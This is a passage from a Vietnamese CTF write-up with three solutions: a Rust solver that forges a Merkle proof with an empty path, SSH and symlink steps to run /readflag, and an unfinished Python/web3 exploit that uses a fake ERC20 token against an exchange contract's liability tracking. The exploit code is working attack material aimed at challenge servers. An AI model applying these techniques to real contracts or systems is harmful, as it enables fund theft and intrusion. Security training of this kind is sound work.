</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[*] V8 Solver: Parallel Monte Carlo (50k Sims)&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[*] Connecting to </span><span class="si">{}</span><span class="s">:</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">target_host</span><span class="p">,</span><span class="w"> </span><span class="n">target_port</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TcpStream</span>::<span class="n">connect</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">:</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">target_host</span><span class="p">,</span><span class="w"> </span><span class="n">target_port</span><span class="p">))</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BufReader</span>::<span class="n">new</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">try_clone</span><span class="p">()</span><span class="o">?</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">re_table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Regex</span>::<span class="n">new</span><span class="p">(</span><span class="sa">r</span><span class="s">&#34;^\s*[\*\s]?\s*(\d+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+\[\s*([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s*\]&#34;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">re_dist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Regex</span>::<span class="n">new</span><span class="p">(</span><span class="sa">r</span><span class="s">&#34;Race distance: (\d+)m&#34;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">re_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Regex</span>::<span class="n">new</span><span class="p">(</span><span class="sa">r</span><span class="s">&#34;Merkle root: ([0-9a-fA-F]+)&#34;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">horses</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">ParsedHorse</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">race_distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="k">u32</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">current_merkle_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">loop</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">match</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">line</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nb">Ok</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">break</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nb">Ok</span><span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">let</span><span class="w"> </span><span class="n">trimmed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">line</span><span class="p">.</span><span class="n">trim</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">trimmed</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">trimmed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">trimmed</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&#34;Round&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">horses</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">current_merkle_root</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[&gt;] Sending Horse Name...&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;HackerHorse&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">trimmed</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="s">&#34;4) End spurt&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[&gt;] Sending Strategy (1)...&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">caps</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">re_dist</span><span class="p">.</span><span class="n">captures</span><span class="p">(</span><span class="n">trimmed</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">race_distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caps</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">parse</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">caps</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">re_root</span><span class="p">.</span><span class="n">captures</span><span class="p">(</span><span class="n">trimmed</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">current_merkle_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caps</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">to_string</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">caps</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">re_table</span><span class="p">.</span><span class="n">captures</span><span class="p">(</span><span class="n">trimmed</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">caps</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">parse</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caps</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">trim</span><span class="p">().</span><span class="n">to_string</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">strat_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caps</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">trim</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">strategy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">strat_str</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&#34;Front&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Strategy</span>::<span class="n">Front</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">strat_str</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&#34;Pace&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Strategy</span>::<span class="n">Pace</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">strat_str</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&#34;Late&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Strategy</span>::<span class="n">Late</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Strategy</span>::<span class="n">End</span><span class="w"> </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">stats</span>: <span class="p">[</span><span class="kt">u64</span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">caps</span><span class="p">[</span><span class="mi">4</span><span class="p">].</span><span class="n">parse</span>::<span class="o">&lt;</span><span class="kt">f64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">unwrap</span><span class="p">().</span><span class="n">round</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">caps</span><span class="p">[</span><span class="mi">5</span><span class="p">].</span><span class="n">parse</span>::<span class="o">&lt;</span><span class="kt">f64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">unwrap</span><span class="p">().</span><span class="n">round</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">caps</span><span class="p">[</span><span class="mi">6</span><span class="p">].</span><span class="n">parse</span>::<span class="o">&lt;</span><span class="kt">f64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">unwrap</span><span class="p">().</span><span class="n">round</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">caps</span><span class="p">[</span><span class="mi">7</span><span class="p">].</span><span class="n">parse</span>::<span class="o">&lt;</span><span class="kt">f64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">unwrap</span><span class="p">().</span><span class="n">round</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">caps</span><span class="p">[</span><span class="mi">8</span><span class="p">].</span><span class="n">parse</span>::<span class="o">&lt;</span><span class="kt">f64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">unwrap</span><span class="p">().</span><span class="n">round</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">];</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">horses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">ParsedHorse</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">index</span>: <span class="nc">idx</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">strategy</span><span class="p">,</span><span class="w"> </span><span class="n">stats</span><span class="w"> </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">trimmed</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="s">&#34;Submit your proof JSON:&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">predicted_winner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">predict_winner_parallel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">horses</span><span class="p">,</span><span class="w"> </span><span class="n">race_distance</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">forged</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ForgedProofPayload</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">index</span>: <span class="nc">predicted_winner</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">leaf</span>: <span class="nc">current_merkle_root</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">path_elements</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">path_indices</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">let</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serde_json</span>::<span class="n">to_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">forged</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[&gt;] Exploit Index </span><span class="si">{}</span><span class="s">...&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">predicted_winner</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;{}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">trimmed</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="s">&#34;W1{&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n</span><span class="s">[!!!] FLAG FOUND: </span><span class="si">{}</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">trimmed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">std</span>::<span class="n">process</span>::<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nb">Err</span><span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">break</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>Flag:</strong> <code>W1{1-F0rG07_T0_ch3Ck-PATh-l3ng7h-0F-th3_m3rKl3-TR33450dba}</code></p>
<h1 id="reverse">
<a class="header-anchor" href="#reverse"></a>
Reverse
</h1><h2 id="buzzing">
<a class="header-anchor" href="#buzzing"></a>
Buzzing
</h2><p>Mình tải private key <code>id_ed25519</code> về và kết nối tới server:</p>
<ul>
<li>Cấp quyền: <code>chmod 600 id_ed25519</code></li>
<li>Connect: <code>ssh -i id_ed25519 bocchi@spawner.zaki.moe -p 10229</code></li>
<li>Di chuyển tới thư mục gốc: <code>cd /</code></li>
<li>Tạo 1 symbolic link với <code>/readflag</code> để có quyền đọc: <code>ln -s /readflag /tmp/flag_reader</code></li>
<li>Mở link mới tạo: <code>/tmp/flag_reader</code>
<strong>Flag:</strong> <code>W1{just_4_s1mpl3_3bpf_l04d3r_buzz1n'_4r0und_fufu_76274bc788378a36b3345a49948045e9}</code></li>
</ul>
<h1 id="web3">
<a class="header-anchor" href="#web3"></a>
Web3
</h1><h2 id="freex">
<a class="header-anchor" href="#freex"></a>
Freex
</h2><p>Bài này mô phỏng một sàn giao dịch cho phép nạp, rút, stake và hoán đổi token.
Hàm <code>isSolved()</code> trong <code>Setup.sol</code> yêu cầu người chơi phải sở hữu &gt; 10 oneEth.</p>
<p>Mình giải được bài này qua việc khai thác lỗ hổng quản lý nợ của contract <code>Exchange.sol</code> kết hợp với việc sàn không kiểm tra loại token được phép giao dịch.</p>
<p>Vì contract Exchange không có Whitelist mà nó chấp nhận mọi token tuân thủ chuẩn ERC20 nên mình sẽ tự in ra <code>FakeToken</code> và dùng token này để làm <code>receivedWannaETH</code> lên con số mình muốn.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">FAKE_TOKEN_SRC</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="s2">pragma solidity ^0.8.20;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">contract FakeToken {
</span></span></span><span class="line"><span class="cl"><span class="s2">    string public name = &#34;Fake&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">    string public symbol = &#34;FAKE&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">    uint8 public decimals = 18;
</span></span></span><span class="line"><span class="cl"><span class="s2">    uint256 public totalSupply = 1000000 * 10**18;
</span></span></span><span class="line"><span class="cl"><span class="s2">    mapping(address =&gt; uint256) public balanceOf;
</span></span></span><span class="line"><span class="cl"><span class="s2">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    constructor() {
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[msg.sender] = totalSupply;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function transfer(address to, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        require(balanceOf[msg.sender] &gt;= value, &#34;Balance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[msg.sender] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[to] += value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function approve(address spender, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        allowance[msg.sender][spender] = value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function transferFrom(address from, address to, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        require(balanceOf[from] &gt;= value, &#34;Balance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        if (allowance[from][msg.sender] != type(uint256).max) {
</span></span></span><span class="line"><span class="cl"><span class="s2">            require(allowance[from][msg.sender] &gt;= value, &#34;Allowance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">            allowance[from][msg.sender] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        }
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[from] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[to] += value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>Sau đó, mình tận dụng lỗ hổng giữa <code>exchangeToken</code> và <code>deposit</code> vì khi số dư nhỏ hơn 0 thì contract <code>exchangeToken</code> ghi nhận mình đang nợ và thêm token vào <code>liabilities</code>. Tuy nhiên khi nạp tiền vào để trả nợ thì contract lại không xóa token khỏi <code>liabilities</code>, điều đó làm hệ thống nghĩ mình vẫn còn một khoản nợ. Lúc này, mình gọi hàm <code>claimReceivedWannaETH</code>, lấy <code>receivedWannaETH</code> từ <code>exchangeToken</code> và nhận đủ điểm để đổi ra tiền thật thỏa mãn yêu cầu đề bài.</p>
<p>Sau đây là script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">install_solc</span><span class="p">,</span> <span class="n">compile_source</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;challenge.cnsc.com.vn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT_NC</span> <span class="o">=</span> <span class="mi">31284</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT_RPC</span> <span class="o">=</span> <span class="mi">30904</span>
</span></span><span class="line"><span class="cl"><span class="n">UUID</span> <span class="o">=</span> <span class="s2">&#34;342df168-88f2-4813-ab3e-b7b2edfec29d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PRIVATE_KEY</span> <span class="o">=</span> <span class="s2">&#34;605b3efe7abd3e4ddab9268a3fe8edfea38a8a24cce3b5dc5d95e65079d227b4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SETUP_ADDRESS</span> <span class="o">=</span> <span class="s2">&#34;0x26644A4BF4c72515AF907c85AB71C8eC7c94b647&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RPC_URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT_RPC</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">UUID</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FAKE_TOKEN_SRC</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="s2">pragma solidity ^0.8.20;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">contract FakeToken {
</span></span></span><span class="line"><span class="cl"><span class="s2">    string public name = &#34;Fake&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">    string public symbol = &#34;FAKE&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">    uint8 public decimals = 18;
</span></span></span><span class="line"><span class="cl"><span class="s2">    uint256 public totalSupply = 1000000 * 10**18;
